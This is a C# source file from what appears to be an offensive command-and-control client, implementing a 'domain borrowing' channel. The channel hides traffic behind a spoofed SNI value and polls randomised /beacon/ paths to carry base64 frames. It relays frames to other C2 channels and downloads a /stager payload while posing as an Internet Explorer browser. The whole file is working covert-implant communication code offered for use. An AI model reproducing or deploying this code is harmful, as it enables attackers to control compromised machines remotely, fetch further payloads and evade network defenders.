using System;
using ClientC2.interfaces;
using System.Collections.Generic;
using System.Threading;
using ClientC2.helpers;

namespace ClientC2.channels
{
    class DomainBorrowingChannel : IC2Channel
    {
        private readonly HttpsClient _client;
        private Dictionary<string, string> headers;

        public DomainBorrowingChannel(string url, string sni, int port)
        {
            this._client = new HttpsClient(url, port, sni, false);
            this.headers = new Dictionary<string, string>();
        }

        public Guid BeaconId { get; private set; }
        public bool Connected { get; private set; }

        public bool Connect()
        {
            string[] parseHeaders = _client.Options("/beacon", "").Split("\n");
            string idHeader = string.Empty;
            string beaconId = string.Empty;

            foreach(string header in parseHeaders)
            {
                if(header.Contains("X-Id-Header"))
                {
                    idHeader = header.Split(" ")[1];
                }
                else if(header.Contains("X-Identifier"))
                {
                    beaconId = header.Split(" ")[1];
                }
            }

            if(beaconId != null)
            {
                this.BeaconId = new Guid(beaconId);
                headers.Add(idHeader, this.BeaconId.ToString());
                this.Connected = true;
            }
            else
            {
                this.Connected = false;
            }

            return this.Connected;
        }

        public void Close()
        {
        }

        public void Dispose()
        {
        }

        public byte[] ReadFrame()
        {
            string b64str;
            while(true)
            {
                b64str = _client.Get(String.Format("/beacon/{0}", Helpers.GenerateMD5(Convert.ToString(Guid.NewGuid()))).ToLower(), headers);
                if (!string.IsNullOrEmpty(b64str)) break;
                Thread.Sleep(1000);
            }

            return Convert.FromBase64String(b64str);
        }

        public void SendFrame(byte[] buffer)
        {
            _client.Post(String.Format("/beacon/{0}", Helpers.GenerateMD5(Convert.ToString(Guid.NewGuid()))).ToLower(), Convert.ToBase64String(buffer), headers);
        }

        public bool ReadAndSendTo(IC2Channel c2)
        {
            var buffer = ReadFrame();
            if (buffer.Length <= 0) return false;
            c2.SendFrame(buffer);

            return true;
        }

        public byte[] GetStager(bool is64bit, int taskWaitTime = 100)
        {
            return GetStager(BeaconId.ToString(), is64bit, taskWaitTime);
        }

        public byte[] GetStager(string pipeName, bool is64Bit, int taskWaitTime = 100)
        {
            var bits = is64Bit ? "x64" : "x86";
            headers.Add("User-Agent", $"Mozilla/5.0 (Windows NT 10.0; {bits}; Trident/7.0; rv:11.0) like Gecko");

            var response = _client.Post("/stager", string.Empty, headers);

            return Convert.FromBase64String(response);
        }       
    }
}
